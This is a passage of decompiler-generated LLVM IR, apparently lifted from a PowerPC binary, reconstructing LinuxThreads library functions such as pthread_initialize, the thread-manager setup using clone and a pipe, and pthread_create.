  uselistorder label %dec_label_pc_10005920, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4194624 = alloca i32, align 4
  %v3_10005948 = load i32, i32* @global_var_1002effc.231, align 4
  store i32 %v3_10005948, i32* @r31, align 4
  %v3_1000594c = icmp eq i32 %v3_10005948, 0
  br i1 %v3_1000594c, label %dec_label_pc_10005954, label %dec_label_pc_10005af0

dec_label_pc_10005954:                            ; preds = %entry
  %v2_10005954 = ptrtoint i32* %stack_var_-4194624 to i32
  %v1_10005958 = call i32 @__asm_rlwinm(i32 %v2_10005954, i32 0, i32 0, i32 10)
  store i32 %v1_10005958, i32* @global_var_1002effc.231, align 4
  store i32 268458340, i32* @lr, align 4
  %v0_10005960 = call i32 @__libc_getpid()
  %v3_1000596c = load i32, i32* bitcast (i32** @global_var_1002ef98.233 to i32*), align 4
  store i32 %v3_1000596c, i32* %r29.global-to-local, align 4
  %v0_10005978 = load i32, i32* @r31, align 4
  store i32 %v0_10005978, i32* @global_var_1002ef9c.234, align 4
  store i32 ptrtoint (i32* @global_var_1002a760 to i32), i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f04c.227 to i32), i32* bitcast (i32** @global_var_1002a7a4.235 to i32*), align 4
  store i32 %v0_10005960, i32* @global_var_1002a774.236, align 4
  store i32 ptrtoint (i32* @global_var_1002f050.226 to i32), i32* bitcast (i32** @global_var_1002a7ac.237 to i32*), align 4
  %v3_100059b84 = icmp eq i32 %v3_1000596c, 0
  br i1 %v3_100059b84, label %dec_label_pc_100059c0, label %dec_label_pc_100059a4

dec_label_pc_100059a4:                            ; preds = %dec_label_pc_10005954, %dec_label_pc_100059b4
  %v1_100059b0 = phi i32 [ %v3_100059b4, %dec_label_pc_100059b4 ], [ %v3_1000596c, %dec_label_pc_10005954 ]
  %v1_100059a4 = add i32 %v1_100059b0, 52
  %v2_100059a4 = inttoptr i32 %v1_100059a4 to i32*
  %v3_100059a4 = load i32, i32* %v2_100059a4, align 4
  %v3_100059a8 = icmp eq i32 %v3_100059a4, 1
  br i1 %v3_100059a8, label %dec_label_pc_100059b4, label %dec_label_pc_100059b0

dec_label_pc_100059b0:                            ; preds = %dec_label_pc_100059a4
  %v0_100059b0 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100059b0, i32* %v2_100059a4, align 4
  %v0_100059b4.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100059b4

dec_label_pc_100059b4:                            ; preds = %dec_label_pc_100059a4, %dec_label_pc_100059b0
  %v0_100059b4 = phi i32 [ %v1_100059b0, %dec_label_pc_100059a4 ], [ %v0_100059b4.pre, %dec_label_pc_100059b0 ]
  %v1_100059b4 = add i32 %v0_100059b4, 32
  %v2_100059b4 = inttoptr i32 %v1_100059b4 to i32*
  %v3_100059b4 = load i32, i32* %v2_100059b4, align 4
  store i32 %v3_100059b4, i32* %r29.global-to-local, align 4
  %v3_100059b8 = icmp eq i32 %v3_100059b4, 0
  br i1 %v3_100059b8, label %dec_label_pc_100059b8.dec_label_pc_100059c0_crit_edge, label %dec_label_pc_100059a4

dec_label_pc_100059b8.dec_label_pc_100059c0_crit_edge: ; preds = %dec_label_pc_100059b4
  br label %dec_label_pc_100059c0

dec_label_pc_100059c0:                            ; preds = %dec_label_pc_100059b8.dec_label_pc_100059c0_crit_edge, %dec_label_pc_10005954
  %v2_100059c0 = ptrtoint i32* %stack_var_-312 to i32
  store i32 ptrtoint (i32* @global_var_100059d0.238 to i32), i32* @lr, align 4
  %v2_100059cc = call i32 @getrlimit(i32 3, i32 %v2_100059c0)
  store i32 ptrtoint (i32* @global_var_100059d4.239 to i32), i32* @lr, align 4
  %v0_100059d0 = call i32 @__GI_getpagesize()
  %tmp = mul i32 %v0_100059d0, -2
  %v2_100059dc = add i32 %tmp, 2097152
  %v3_100059e0 = load i32, i32* %stack_var_-312, align 4
  %v3_100059e4 = icmp ugt i32 %v3_100059e0, %v2_100059dc
  br i1 %v3_100059e4, label %dec_label_pc_100059ec, label %dec_label_pc_100059fc

dec_label_pc_100059ec:                            ; preds = %dec_label_pc_100059c0
  store i32 %v2_100059dc, i32* %stack_var_-312, align 4
  store i32 268458492, i32* @lr, align 4
  %v3_100059f8 = call i32 @__GI_setrlimit(i32 3, i32 %v2_100059c0, i32 %v2_100059dc)
  br label %dec_label_pc_100059fc

dec_label_pc_100059fc:                            ; preds = %dec_label_pc_100059c0, %dec_label_pc_100059ec
  %v2_100059fc = ptrtoint i32* %stack_var_-172 to i32
  store i32 268459880, i32* %stack_var_-176, align 4
  store i32 268458520, i32* @lr, align 4
  %v1_10005a14 = call i32 @sigemptyset(i32 %v2_100059fc)
  %v3_10005a18 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 268458544, i32* @lr, align 4
  %v4_10005a2c = call i32 @__libc_sigaction(i32 %v3_10005a18, i32* nonnull %stack_var_-176, i32 0)
  %v3_10005a30 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 %v2_100059fc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r27, align 4
  store i32 268459588, i32* %stack_var_-176, align 4
  store i32 268458572, i32* @lr, align 4
  %v2_10005a48 = call i32 @__GI_sigaddset(i32 %v2_100059fc, i32 %v3_10005a30)
  %v3_10005a4c = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268458592, i32* @lr, align 4
  %v4_10005a5c = call i32 @__libc_sigaction(i32 %v3_10005a4c, i32* nonnull %stack_var_-176, i32 0)
  %v3_10005a60 = load i32, i32* @global_var_1002ef5c.230, align 4
  %tmp15 = icmp slt i32 %v3_10005a60, 1
  br i1 %tmp15, label %dec_label_pc_10005a90, label %dec_label_pc_10005a6c

dec_label_pc_10005a6c:                            ; preds = %dec_label_pc_100059fc
  store i32 268457324, i32* %stack_var_-176, align 4
  store i32 268458624, i32* @lr, align 4
  %v1_10005a7c = call i32 @sigemptyset(i32 %v2_100059fc)
  %v3_10005a80 = load i32, i32* @global_var_1002ef5c.230, align 4
  store i32 268458640, i32* @lr, align 4
  %v4_10005a8c = call i32 @__libc_sigaction(i32 %v3_10005a80, i32* nonnull %stack_var_-176, i32 0)
  br label %dec_label_pc_10005a90

dec_label_pc_10005a90:                            ; preds = %dec_label_pc_100059fc, %dec_label_pc_10005a6c
  %v2_10005a90 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10005a90, i32* %r29.global-to-local, align 4
  store i32 268458652, i32* @lr, align 4
  %v1_10005a98 = call i32 @sigemptyset(i32 %v2_10005a90)
  %v3_10005a9c = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 %v2_10005a90, i32* @r3, align 4
  store i32 268458664, i32* @lr, align 4
  %v2_10005aa4 = call i32 @__GI_sigaddset(i32 %v2_10005a90, i32 %v3_10005a9c)
  store i32 268458680, i32* @lr, align 4
  %v3_10005ab4 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10005a90, i32 0)
  store i32 %v2_10005a90, i32* @r3, align 4
  store i32 268458692, i32* @lr, align 4
  %v1_10005ac0 = call i32 @__GI_sigdelset(i32 %v2_10005a90)
  %v3_10005ac4 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 %v2_10005a90, i32* @r3, align 4
  store i32 268458704, i32* @lr, align 4
  %v2_10005acc = call i32 @__GI_sigaddset(i32 %v2_10005a90, i32 %v3_10005ac4)
  store i32 268458720, i32* @lr, align 4
  %v3_10005adc = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10005a90, i32 0)
  store i32 268458736, i32* @lr, align 4
  %v2_10005aec = call i32 @on_exit(i32 268457804, i32 0)
  br label %dec_label_pc_10005af0

dec_label_pc_10005af0:                            ; preds = %entry, %dec_label_pc_10005a90
  %.0 = phi i32 [ %v2_10005aec, %dec_label_pc_10005a90 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_10005a90, { 0, 2, 1, 4, 3, 5, 7, 6, 8, 9 }
  uselistorder i32 %v2_100059fc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_100059dc, { 1, 2, 0 }
  uselistorder i32 %v3_100059b4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32* @global_var_1002f04c.227, { 1, 0 }
  uselistorder label %dec_label_pc_10005af0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a90, { 1, 0 }
  uselistorder label %dec_label_pc_100059fc, { 1, 0 }
  uselistorder label %dec_label_pc_100059b4, { 1, 0 }
  uselistorder label %dec_label_pc_100059a4, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v3_10005b1c = load i32, i32* @global_var_1002f010.240, align 4
  %v2_10005b20 = inttoptr i32 %v3_10005b1c to i32*
  store i32 1, i32* %v2_10005b20, align 4
  %v3_10005b28 = load i32, i32* @global_var_1002effc.231, align 4
  %v3_10005b2c = icmp eq i32 %v3_10005b28, 0
  br i1 %v3_10005b2c, label %dec_label_pc_10005b34, label %dec_label_pc_10005b38

dec_label_pc_10005b34:                            ; preds = %entry
  store i32 268458808, i32* @lr, align 4
  %v1_10005b34 = call i32 @pthread_initialize(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_10005b38

dec_label_pc_10005b38:                            ; preds = %entry, %dec_label_pc_10005b34
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r30.global-to-local, align 4
  %v3_10005b40 = load i32, i32* @global_var_1002f074.241, align 4
  %v1_10005b44 = mul i32 %v3_10005b40, 2
  %v1_10005b48 = add i32 %v1_10005b44, -32
  store i32 %v1_10005b48, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005b50.242 to i32), i32* @lr, align 4
  %v0_10005b4c = call i32 @malloc()
  %v3_10005b54 = icmp eq i32 %v0_10005b4c, 0
  store i32 %v0_10005b4c, i32* @global_var_1002f000.223, align 4
  br i1 %v3_10005b54, label %dec_label_pc_10005d28, label %dec_label_pc_10005b60

dec_label_pc_10005b60:                            ; preds = %dec_label_pc_10005b38
  %v3_10005b60 = load i32, i32* @global_var_1002f074.241, align 4
  %v1_10005b68 = mul i32 %v3_10005b60, 2
  %v2_10005b70 = ptrtoint i32* %stack_var_-184 to i32
  %v2_10005b6c = add i32 %v0_10005b4c, -32
  %v1_10005b74 = add i32 %v2_10005b6c, %v1_10005b68
  store i32 %v1_10005b74, i32* @global_var_1002f004.224, align 4
  store i32 268458880, i32* @lr, align 4
  %v2_10005b7c = call i32 @__GI_pipe(i32 %v2_10005b70, i32 %v1_10005b74)
  %v3_10005b80 = icmp eq i32 %v2_10005b7c, -1
  br i1 %v3_10005b80, label %dec_label_pc_10005b88, label %dec_label_pc_10005b94

dec_label_pc_10005b88:                            ; preds = %dec_label_pc_10005b60
  %v3_10005b88 = load i32, i32* @global_var_1002f000.223, align 4
  store i32 %v3_10005b88, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005b90.243 to i32), i32* @lr, align 4
  %v0_10005b8c = call i32 @free()
  br label %dec_label_pc_10005c90

dec_label_pc_10005b94:                            ; preds = %dec_label_pc_10005b60
  %v3_10005b98 = load i32, i32* @global_var_1002f018.244, align 4
  %v3_10005b9c = icmp eq i32 %v3_10005b98, 0
  br i1 %v3_10005b9c, label %dec_label_pc_10005bacthread-pre-split, label %dec_label_pc_10005ba4

dec_label_pc_10005ba4:                            ; preds = %dec_label_pc_10005b94
  store i32 %v3_10005b98, i32* @global_var_1002a8fc.245, align 4
  br label %dec_label_pc_10005bac

dec_label_pc_10005bacthread-pre-split:            ; preds = %dec_label_pc_10005b94
  %v3_10005bb4.pr = load i32, i32* @global_var_1002a8fc.245, align 4
  br label %dec_label_pc_10005bac

dec_label_pc_10005bac:                            ; preds = %dec_label_pc_10005bacthread-pre-split, %dec_label_pc_10005ba4
  %v3_10005bb4 = phi i32 [ %v3_10005bb4.pr, %dec_label_pc_10005bacthread-pre-split ], [ %v3_10005b98, %dec_label_pc_10005ba4 ]
  %v3_10005bb8 = icmp eq i32 %v3_10005bb4, 0
  br i1 %v3_10005bb8, label %dec_label_pc_10005c48, label %dec_label_pc_10005bc0

dec_label_pc_10005bc0:                            ; preds = %dec_label_pc_10005bac
  %v3_10005bc4 = load i32, i32* @global_var_1002f030.246, align 4
  %v3_10005bc8 = load i32, i32* @global_var_1002a900.247, align 4
  %v2_10005bcc = or i32 %v3_10005bc8, %v3_10005bc4
  %v1_10005bd0 = and i32 %v2_10005bcc, 128
  %v3_10005bd0 = icmp eq i32 %v1_10005bd0, 0
  br i1 %v3_10005bd0, label %dec_label_pc_10005c48, label %dec_label_pc_10005bd8

dec_label_pc_10005bd8:                            ; preds = %dec_label_pc_10005bc0
  store i32 0, i32* @r4, align 4
  %v3_10005be4 = load i32, i32* bitcast (i32** @global_var_1002a95c.250 to i32*), align 4
  store i32 %v3_10005be4, i32* @r3, align 4
  store i32 268458988, i32* @lr, align 4
  %v0_10005be8 = call i32 @__pthread_lock()
  %v3_10005bec = load i32, i32* @global_var_1002f004.224, align 4
  %v3_10005bf0 = load i32, i32* %stack_var_-184, align 4
  store i32 268459016, i32* @lr, align 4
  %v4_10005c04 = call i32 @clone(i32 268468028, i32 %v3_10005bec, i32 3840, i32 %v3_10005bf0)
  store i32 %v4_10005c04, i32* @r3, align 4
  %v3_10005c08 = icmp eq i32 %v4_10005c04, -1
  store i32 %v4_10005c04, i32* %r30.global-to-local, align 4
  br i1 %v3_10005c08, label %dec_label_pc_10005c38, label %dec_label_pc_10005c14

dec_label_pc_10005c14:                            ; preds = %dec_label_pc_10005bd8
  %v0_10005c18 = load i32, i32* @r31, align 4
  store i32 %v0_10005c18, i32* @global_var_1002aaec.251, align 4
  store i32 8, i32* @global_var_1002aae8.252, align 4
  store i32 2049, i32* @global_var_1002a950.253, align 4
  store i32 %v4_10005c04, i32* @global_var_1002a954.221, align 4
  store i32 %v0_10005c18, i32* @global_var_1002f038.254, align 4
  %v1_10005c34 = call i32 @__linuxthreads_create_event(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_10005c38

dec_label_pc_10005c38:                            ; preds = %dec_label_pc_10005bd8, %dec_label_pc_10005c14
  %v3_10005c38 = load i32, i32* bitcast (i32** @global_var_1002a95c.250 to i32*), align 4
  store i32 %v3_10005c38, i32* @r3, align 4
  store i32 268459072, i32* @lr, align 4
  %v0_10005c3c = call i32 @__pthread_unlock()
  %v0_10005c40 = load i32, i32* %r30.global-to-local, align 4
  %v3_10005c40 = icmp eq i32 %v0_10005c40, 0
  br i1 %v3_10005c40, label %dec_label_pc_10005c48, label %dec_label_pc_10005c6c

dec_label_pc_10005c48:                            ; preds = %dec_label_pc_10005c38, %dec_label_pc_10005bc0, %dec_label_pc_10005bac
  %v3_10005c4c = load i32, i32* %stack_var_-184, align 4
  %v3_10005c50 = load i32, i32* @global_var_1002f004.224, align 4
  store i32 268459112, i32* @lr, align 4
  %v4_10005c64 = call i32 @clone(i32 268466280, i32 %v3_10005c50, i32 3840, i32 %v3_10005c4c)
  store i32 %v4_10005c64, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005c6c

dec_label_pc_10005c6c:                            ; preds = %dec_label_pc_10005c38, %dec_label_pc_10005c48
  %v0_10005cb4 = phi i32 [ %v4_10005c64, %dec_label_pc_10005c48 ], [ %v0_10005c40, %dec_label_pc_10005c38 ]
  %v3_10005c6c = icmp eq i32 %v0_10005cb4, -1
  br i1 %v3_10005c6c, label %dec_label_pc_10005c74, label %dec_label_pc_10005c98

dec_label_pc_10005c74:                            ; preds = %dec_label_pc_10005c6c
  %v3_10005c78 = load i32, i32* @global_var_1002f000.223, align 4
  store i32 %v3_10005c78, i32* @r3, align 4
  store i32 268459136, i32* @lr, align 4
  %v0_10005c7c = call i32 @free()
  %v3_10005c80 = load i32, i32* %stack_var_-184, align 4
  store i32 268459144, i32* @lr, align 4
  %v1_10005c84 = call i32 @__libc_close(i32 %v3_10005c80)
  store i32 ptrtoint (i32* @global_var_10005c90.255 to i32), i32* @lr, align 4
  %v1_10005c8c = call i32 @__libc_close(i32 %tmp2)
  br label %dec_label_pc_10005c90

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005b88, %dec_label_pc_10005c74
  br label %dec_label_pc_10005d28

dec_label_pc_10005c98:                            ; preds = %dec_label_pc_10005c6c
  %v3_10005ca0 = load i32, i32* @global_var_1002f03c.256, align 4
  %v3_10005cac = icmp eq i32 %v3_10005ca0, 0
  store i32 %v0_10005cb4, i32* @global_var_1002a954.221, align 4
  store i32 %tmp2, i32* @global_var_1002ef34.220, align 4
  %v3_10005cc0 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10005cc0, i32* @global_var_1002f01c.225, align 4
  store i32 2049, i32* @global_var_1002a950.253, align 4
  br i1 %v3_10005cac, label %dec_label_pc_10005cf0, label %dec_label_pc_10005cd4

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_10005c98
  %v3_10005cd8 = load i32, i32* @global_var_1002ef5c.230, align 4
  %tmp8 = icmp slt i32 %v3_10005cd8, 1
  br i1 %tmp8, label %dec_label_pc_10005cf0, label %dec_label_pc_10005ce4

dec_label_pc_10005ce4:                            ; preds = %dec_label_pc_10005cd4
  store i32 268459240, i32* @lr, align 4
  %v1_10005ce4 = call i32 @__GI_raise(i32 %v3_10005cd8)
  %v0_10005ce8 = load i32, i32* @r2, align 4
  store i32 %v0_10005ce8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005cf0.257 to i32), i32* @lr, align 4
  %v0_10005cec = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_10005cf0

dec_label_pc_10005cf0:                            ; preds = %dec_label_pc_10005cd4, %dec_label_pc_10005c98, %dec_label_pc_10005ce4
  %v2_10005cfc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_10005cf8

dec_label_pc_10005cf8:                            ; preds = %dec_label_pc_10005d14, %dec_label_pc_10005cf0
  %v3_10005d00 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268459276, i32* @lr, align 4
  %v2_10005d08 = call i32 @__libc_write(i32 %v3_10005d00, i32 %v2_10005cfc)
  %v3_10005d0c = icmp eq i32 %v2_10005d08, -1
  br i1 %v3_10005d0c, label %dec_label_pc_10005d14, label %dec_label_pc_10005d24

dec_label_pc_10005d14:                            ; preds = %dec_label_pc_10005cf8
  %v0_10005d14 = call i32 @__errno_location()
  %v1_10005d18 = inttoptr i32 %v0_10005d14 to i32*
  %v2_10005d18 = load i32, i32* %v1_10005d18, align 4
  %v3_10005d1c = icmp eq i32 %v2_10005d18, 4
  br i1 %v3_10005d1c, label %dec_label_pc_10005cf8, label %dec_label_pc_10005d24

dec_label_pc_10005d24:                            ; preds = %dec_label_pc_10005cf8, %dec_label_pc_10005d14
  br label %dec_label_pc_10005d28

dec_label_pc_10005d28:                            ; preds = %dec_label_pc_10005b38, %dec_label_pc_10005c90, %dec_label_pc_10005d24
  %v0_10005d28 = phi i32 [ -1, %dec_label_pc_10005b38 ], [ -1, %dec_label_pc_10005c90 ], [ 0, %dec_label_pc_10005d24 ]
  ret i32 %v0_10005d28

; uselistorder directives
  uselistorder i32 %v4_10005c04, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10005b98, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_10005d28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005d24, { 1, 0 }
  uselistorder label %dec_label_pc_10005cf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005c90, { 1, 0 }
  uselistorder label %dec_label_pc_10005c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005c38, { 1, 0 }
  uselistorder label %dec_label_pc_10005b38, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_10005d40 = load i32, i32* @r3, align 4
  %v1_10005d40 = call i32 @pthread_initialize(i32 %v0_10005d40)
  ret i32 %v1_10005d40

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002a760 to i32), i32* @r2, align 4
  %v2_10005d5c = call i32 @__libc_pthread_init(i32 0, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v2_10005d5c, i32* @global_var_1002f010.240, align 4
  ret i32 %v2_10005d5c
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v3_10005d9c = load i32, i32* @global_var_1002ef34.220, align 4
  %v0_10005da0 = load i32, i32* @r2, align 4
  store i32 %v0_10005da0, i32* @r31, align 4
  %tmp13 = icmp sgt i32 %v3_10005d9c, -1
  br i1 %tmp13, label %dec_label_pc_10005dbc, label %dec_label_pc_10005dac

dec_label_pc_10005dac:                            ; preds = %entry
  store i32 268459440, i32* @lr, align 4
  %v1_10005dac = call i32 @__pthread_initialize_manager(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v1_10005db0 = icmp slt i32 %v1_10005dac, 0
  br i1 %v1_10005db0, label %dec_label_pc_10005e30, label %dec_label_pc_10005dac.dec_label_pc_10005dbc_crit_edge

dec_label_pc_10005dac.dec_label_pc_10005dbc_crit_edge: ; preds = %dec_label_pc_10005dac
  %v0_10005ddc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005dbc

dec_label_pc_10005dbc:                            ; preds = %dec_label_pc_10005dac.dec_label_pc_10005dbc_crit_edge, %entry
  %v0_10005ddc = phi i32 [ %v0_10005ddc.pre, %dec_label_pc_10005dac.dec_label_pc_10005dbc_crit_edge ], [ %v0_10005da0, %entry ]
  %v2_10005dc8 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v0_10005ddc, i32* %stack_var_-184, align 4
  store i32 268459492, i32* @lr, align 4
  %v3_10005de0 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10005dc8)
  %v2_10005de8 = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10005de4

dec_label_pc_10005de4:                            ; preds = %dec_label_pc_10005e00, %dec_label_pc_10005dbc
  %v3_10005dec = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268459512, i32* @lr, align 4
  %v2_10005df4 = call i32 @__libc_write(i32 %v3_10005dec, i32 %v2_10005de8)
  %v3_10005df8 = icmp eq i32 %v2_10005df4, -1
  br i1 %v3_10005df8, label %dec_label_pc_10005e00, label %dec_label_pc_10005e10

dec_label_pc_10005e00:                            ; preds = %dec_label_pc_10005de4
  %v0_10005e00 = call i32 @__errno_location()
  %v1_10005e04 = inttoptr i32 %v0_10005e00 to i32*
  %v2_10005e04 = load i32, i32* %v1_10005e04, align 4
  %v3_10005e08 = icmp eq i32 %v2_10005e04, 4
  br i1 %v3_10005e08, label %dec_label_pc_10005de4, label %dec_label_pc_10005e10

dec_label_pc_10005e10:                            ; preds = %dec_label_pc_10005de4, %dec_label_pc_10005e00
  %v0_10005e10 = load i32, i32* @r31, align 4
  store i32 %v0_10005e10, i32* @r3, align 4
  store i32 268459544, i32* @lr, align 4
  %v1_10005e14 = call i32 @suspend(i32 %v0_10005e10)
  %v0_10005e18 = load i32, i32* @r31, align 4
  %v1_10005e18 = add i32 %v0_10005e18, 52
  %v2_10005e18 = inttoptr i32 %v1_10005e18 to i32*
  %v3_10005e18 = load i32, i32* %v2_10005e18, align 4
  %v3_10005e1c = icmp eq i32 %v3_10005e18, 0
  br i1 %v3_10005e1c, label %dec_label_pc_10005e24, label %dec_label_pc_10005e2c

dec_label_pc_10005e24:                            ; preds = %dec_label_pc_10005e10
  %v1_10005e24 = add i32 %v0_10005e18, 48
  %v2_10005e24 = inttoptr i32 %v1_10005e24 to i32*
  %v3_10005e24 = load i32, i32* %v2_10005e24, align 4
  %v1_10005e28 = load i32, i32* @r27, align 4
  %v2_10005e28 = inttoptr i32 %v1_10005e28 to i32*
  store i32 %v3_10005e24, i32* %v2_10005e28, align 4
  %v0_10005e2c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005e2c

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005e10, %dec_label_pc_10005e24
  %v0_10005e2c = phi i32 [ %v0_10005e18, %dec_label_pc_10005e10 ], [ %v0_10005e2c.pre, %dec_label_pc_10005e24 ]
  %v1_10005e2c = add i32 %v0_10005e2c, 52
  %v2_10005e2c = inttoptr i32 %v1_10005e2c to i32*
  %v3_10005e2c = load i32, i32* %v2_10005e2c, align 4
  br label %dec_label_pc_10005e30

dec_label_pc_10005e30:                            ; preds = %dec_label_pc_10005dac, %dec_label_pc_10005e2c
  %v0_10005e40 = phi i32 [ 11, %dec_label_pc_10005dac ], [ %v3_10005e2c, %dec_label_pc_10005e2c ]
  ret i32 %v0_10005e40

; uselistorder directives
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 (i32)* @suspend, { 1, 0 }
  uselistorder label %dec_label_pc_10005e30, { 1, 0 }
  uselistorder label %dec_label_pc_10005e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e10, { 1, 0 }
}

define i32 @pthread_handle_sigcancel() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002a940.248 to i32), i32* %r9.global-to-local, align 4
  %v4_10005e50 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005e50, i32* %stack_var_-16, align 4
  %v5_10005e50 = ptrtoint i32* %stack_var_-16 to i32
  %v0_10005e54 = load i32, i32* @r2, align 4
  %v4_10005e54 = icmp eq i32 %v0_10005e54, ptrtoint (i32* @global_var_1002a940.248 to i32)
  store i32 %v0_10005e54, i32* %r11.global-to-local, align 4
  br i1 %v4_10005e54, label %dec_label_pc_10005e64, label %dec_label_pc_10005ed0

dec_label_pc_10005e64:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005e6c = load i32, i32* @global_var_1002f000.223, align 4
  %v2_10005e70 = icmp ult i32 %v5_10005e50, %v3_10005e6c
  br i1 %v2_10005e70, label %dec_label_pc_10005e98, label %dec_label_pc_10005e78

dec_label_pc_10005e78:                            ; preds = %dec_label_pc_10005e64
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005e7c = load i32, i32* @global_var_1002f004.224, align 4
  %v2_10005e80 = icmp ult i32 %v5_10005e50, %v3_10005e7c
  br i1 %v2_10005e80, label %dec_label_pc_10005eb0, label %dec_label_pc_10005e98

dec_label_pc_10005e94:                            ; preds = %dec_label_pc_10005ea4, %dec_label_pc_10005e98
  %v1_10005e94 = add i32 %v0_10005e94, 16
  br label %dec_label_pc_10005e98

dec_label_pc_10005e98:                            ; preds = %dec_label_pc_10005e64, %dec_label_pc_10005e78, %dec_label_pc_10005e94
  %v0_10005e94 = phi i32 [ %v1_10005e94, %dec_label_pc_10005e94 ], [ ptrtoint (i32* @global_var_1002ac00.258 to i32), %dec_label_pc_10005e78 ], [ ptrtoint (i32* @global_var_1002ac00.258 to i32), %dec_label_pc_10005e64 ]
  store i32 %v0_10005e94, i32* %r9.global-to-local, align 4
  %v1_10005e98 = add i32 %v0_10005e94, 8
  %v2_10005e98 = inttoptr i32 %v1_10005e98 to i32*
  %v3_10005e98 = load i32, i32* %v2_10005e98, align 4
  store i32 %v3_10005e98, i32* %r11.global-to-local, align 4
  %v3_10005e9c = icmp ugt i32 %v5_10005e50, %v3_10005e98
  br i1 %v3_10005e9c, label %dec_label_pc_10005e94, label %dec_label_pc_10005ea4

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005e98
  %v1_10005ea4 = add i32 %v0_10005e94, 12
  %v2_10005ea4 = inttoptr i32 %v1_10005ea4 to i32*
  %v3_10005ea4 = load i32, i32* %v2_10005ea4, align 4
  %v2_10005ea8 = icmp ult i32 %v5_10005e50, %v3_10005ea4
  br i1 %v2_10005ea8, label %dec_label_pc_10005e94, label %dec_label_pc_10005eb0.loopexit

dec_label_pc_10005eb0.loopexit:                   ; preds = %dec_label_pc_10005ea4
  br label %dec_label_pc_10005eb0

dec_label_pc_10005eb0:                            ; preds = %dec_label_pc_10005eb0.loopexit, %dec_label_pc_10005e78
  %v0_10005ec8 = phi i32 [ %v3_10005e98, %dec_label_pc_10005eb0.loopexit ], [ ptrtoint (i32* @global_var_1002a940.248 to i32), %dec_label_pc_10005e78 ]
  store i32 ptrtoint (i32* @global_var_1002a940.248 to i32), i32* %r9.global-to-local, align 4
